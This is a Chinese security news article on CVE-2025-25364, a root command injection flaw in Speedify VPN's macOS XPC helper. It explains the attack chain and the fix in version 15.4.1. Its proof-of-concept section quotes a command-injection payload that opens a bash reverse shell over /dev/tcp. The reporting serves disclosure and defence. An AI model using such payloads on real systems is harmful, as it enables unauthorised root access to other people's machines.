#  【安全圈】Speedify VPN macOS 漏洞使攻击者能够提升权限   
 安全圈   2025-04-21 11:00  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/aBHpjnrGylgOvEXHviaXu1fO2nLov9bZ055v7s8F6w1DD1I0bx2h3zaOx0Mibd5CngBwwj2nTeEbupw7xpBsx27Q/640?wx_fmt=other&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
  
**关键词**  
  
  
  
安全漏洞  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/aBHpjnrGyliaGDNUicceuQpZXIxVYMyQSzF8WiahsvAWc81Sp5KvpzibQkOIFepzJljibRzeNPeZEAvd751I6gHtPOw/640?wx_fmt=png&from=appmsg "")  
  
Speedify VPN 的macOS 应用程序中发现了一个重大安全漏洞，编号为 CVE-2025-25364，该漏洞使用户面临本地权限提升和整个系统被入侵的风险。   
  
SecureLayer7 发现的该漏洞存在于特权辅助工具 me.connectify.SMJobBlessHelper 中，该工具负责为 Speedify VPN 客户端以 root 权限执行系统级操作。该漏洞源于辅助工具的XPC（跨进程通信）接口中不正确的输入验证。  
  
具体来说，传入的 XPC 消息中的两个用户控制字段（cmdPath 和 cmdBin）被直接用于构造命令行字符串，而没有经过充分的清理。   
  
这个疏忽导致了命令注入漏洞，允许任何本地攻击者制作恶意 XPC 消息并注入以 root 身份执行的任意 shell 命令。  
  
攻击链涉及几个功能：  
  
XPC_Connection_Handler_block_invoke： XPC 消息的入口点。它检查字典类型的消息，如果“request”字段为“runSpeedify”，则调用 _handleLaunchSpeedifyMsg。cmdPath 或 cmdBin 的内容未进行验证。  
  
_handleLaunchSpeedifyMsg：从 XPC 字典中检索 cmdPath 和 cmdBin，并将它们（未经检查）传递给下一个函数。  
  
_RunSystemCmd：使用 asprintf 构造并执行命令字符串，直接嵌入用户提供的 cmdPath 和 cmdBin。关键代码如下：  
  
然后使用 system() 执行该命令字符串，这使得攻击者可以轻松注入其他 shell 命令。  
<table><tbody><tr style="box-sizing: border-box;background-color: rgb(240, 240, 240);"><td style="box-sizing: border-box;padding: 2px 8px;border: 1px solid rgba(0, 0, 0, 0);word-break: break-word;"><strong style="box-sizing: border-box;font-weight: bold;"><font style="box-sizing: border-box;vertical-align: inherit;"><font style="box-sizing: border-box;vertical-align: inherit;"><span leaf="">风险因素</span></font></font></strong></td><td style="box-sizing: border-box;padding: 2px 8px;border: 1px solid rgba(0, 0, 0, 0);word-break: break-word;"><strong style="box-sizing: border-box;font-weight: bold;"><font style="box-sizing: border-box;vertical-align: inherit;"><font style="box-sizing: border-box;vertical-align: inherit;"><span leaf="">细节</span></font></font></strong></td></tr><tr style="box-sizing: border-box;"><td style="box-sizing: border-box;padding: 2px 8px;border: 1px solid rgba(0, 0, 0, 0);word-break: break-word;"><font style="box-sizing: border-box;vertical-align: inherit;"><font style="box-sizing: border-box;vertical-align: inherit;"><span leaf="">受影响的产品</span></font></font></td><td style="box-sizing: border-box;padding: 2px 8px;border: 1px solid rgba(0, 0, 0, 0);word-break: break-word;"><font style="box-sizing: border-box;vertical-align: inherit;"><font style="box-sizing: border-box;vertical-align: inherit;"><span leaf="">适用于 macOS 的 Speedify VPN（最高版本 15.0.0）</span></font></font></td></tr><tr style="box-sizing: border-box;background-color: rgb(240, 240, 240);"><td style="box-sizing: border-box;padding: 2px 8px;border: 1px solid rgba(0, 0, 0, 0);word-break: break-word;"><font style="box-sizing: border-box;vertical-align: inherit;"><font style="box-sizing: border-box;vertical-align: inherit;"><span leaf="">影响</span></font></font></td><td style="box-sizing: border-box;padding: 2px 8px;border: 1px solid rgba(0, 0, 0, 0);word-break: break-word;"><font style="box-sizing: border-box;vertical-align: inherit;"><font style="box-sizing: border-box;vertical-align: inherit;"><span leaf="">本地权限提升；以 root 身份执行任意命令。</span></font></font></td></tr><tr style="box-sizing: border-box;"><td style="box-sizing: border-box;padding: 2px 8px;border: 1px solid rgba(0, 0, 0, 0);word-break: break-word;"><font style="box-sizing: border-box;vertical-align: inherit;"><font style="box-sizing: border-box;vertical-align: inherit;"><span leaf="">漏洞利用前提条件</span></font></font></td><td style="box-sizing: border-box;padding: 2px 8px;border: 1px solid rgba(0, 0, 0, 0);word-break: break-word;"><font style="box-sizing: border-box;vertical-align: inherit;"><font style="box-sizing: border-box;vertical-align: inherit;"><span leaf="">本地访问；能够将精心设计的 XPC 消息发送给辅助工具</span></font></font></td></tr><tr style="box-sizing: border-box;background-color: rgb(240, 240, 240);"><td style="box-sizing: border-box;padding: 2px 8px;border: 1px solid rgba(0, 0, 0, 0);word-break: break-word;"><font style="box-sizing: border-box;vertical-align: inherit;"><font style="box-sizing: border-box;vertical-align: inherit;"><span leaf="">CVSS 3.1 评分</span></font></font></td><td style="box-sizing: border-box;padding: 2px 8px;border: 1px solid rgba(0, 0, 0, 0);word-break: break-word;"><font style="box-sizing: border-box;vertical-align: inherit;"><font style="box-sizing: border-box;vertical-align: inherit;"><span leaf="">9.8（严重）</span></font></font></td></tr></tbody></table>  
概念验证漏洞  
  
概念验证 (PoC) 漏洞通过向易受攻击的服务发送精心设计的 XPC 消息 证明了该问题。  
  
通过将 cmdBin 设置为诸如“; bash -i >& /dev/tcp/127.0.0.1/1339 0>&1; echo ”之类的有效载荷，攻击者可以生成具有 root 权限的反向 shell。该漏洞代码以 Objective-C 编写，连接到 me.connectify.SMJobBlessHelper XPC 服务并传递恶意负载，从而立即获得 root 级访问权限。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/aBHpjnrGyliaGDNUicceuQpZXIxVYMyQSzZl5PJFY5FZxSC296aicViawHncl1hZDMbh1kaL8DHJY4gNM2O8uyzLJQ/640?wx_fmt=png&from=appmsg "")  
  
由于辅助工具作为根级守护进程  
  
   
(/Library/PrivilegedHelperTools/me.connectify.SMJobBlessHelper) 运行，成功利用该漏洞意味着攻击者可以：  
  
读取、修改或删除敏感系统文件。  
  
安装持久性恶意软件或后门。  
  
完全控制受影响的 macOS 设备。  
  
因此，此漏洞对运行 Speedify VPN 易受攻击版本（15.4.1 之前版本）的任何系统都构成严重风险。  
  
Speedify VPN在 15.4.1 版本中解决了该漏洞，其中包括对辅助工具的完全重写。   
  
新版本消除了不安全的 XPC 处理并实现了适当的输入验证，关闭了命令注入向量。   
  
强烈建议用户更新到最新版本，以降低被利用的风险。  
  
  
  END    
  
  
阅读推荐  
  
  
[【安全圈】国家部委张某，主动投靠境外间谍机关，案发时企图携密叛逃](https://mp.weixin.qq.com/s?__biz=MzIzMzE4NDU1OQ==&mid=2652069186&idx=1&sn=61924afdbc1ff980ab4242f33589c352&scene=21#wechat_redirect)  
  
  
  
[【安全圈】个人信息3毛/条！快递公司竟成信息贩子，倒卖12.9万条客户数据](https://mp.weixin.qq.com/s?__biz=MzIzMzE4NDU1OQ==&mid=2652069186&idx=2&sn=13b718634e721adf6bd2013d5b004d40&scene=21#wechat_redirect)  
  
  
  
[【安全圈】5700万用户安装的Chrome扩展暗藏追踪代码](https://mp.weixin.qq.com/s?__biz=MzIzMzE4NDU1OQ==&mid=2652069186&idx=3&sn=2b50780a02195bca113399ee09912a67&scene=21#wechat_redirect)  
  
  
  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/aBHpjnrGylgeVsVlL5y1RPJfUdozNyCEft6M27yliapIdNjlcdMaZ4UR4XxnQprGlCg8NH2Hz5Oib5aPIOiaqUicDQ/640?wx_fmt=gif "")  
  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/aBHpjnrGylgeVsVlL5y1RPJfUdozNyCEDQIyPYpjfp0XDaaKjeaU6YdFae1iagIvFmFb4djeiahnUy2jBnxkMbaw/640?wx_fmt=png "")  
  
**安全圈**  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/aBHpjnrGylgeVsVlL5y1RPJfUdozNyCEft6M27yliapIdNjlcdMaZ4UR4XxnQprGlCg8NH2Hz5Oib5aPIOiaqUicDQ/640?wx_fmt=gif "")  
  
  
←扫码关注我们  
  
**网罗圈内热点 专注网络安全**  
  
**实时资讯一手掌握！**  
  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/aBHpjnrGylgeVsVlL5y1RPJfUdozNyCE3vpzhuku5s1qibibQjHnY68iciaIGB4zYw1Zbl05GQ3H4hadeLdBpQ9wEA/640?wx_fmt=gif "")  
  
**好看你就分享 有用就点个赞**  
  
**支持「****安全圈」就点个三连吧！**  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/aBHpjnrGylgeVsVlL5y1RPJfUdozNyCE3vpzhuku5s1qibibQjHnY68iciaIGB4zYw1Zbl05GQ3H4hadeLdBpQ9wEA/640?wx_fmt=gif "")  
  
  
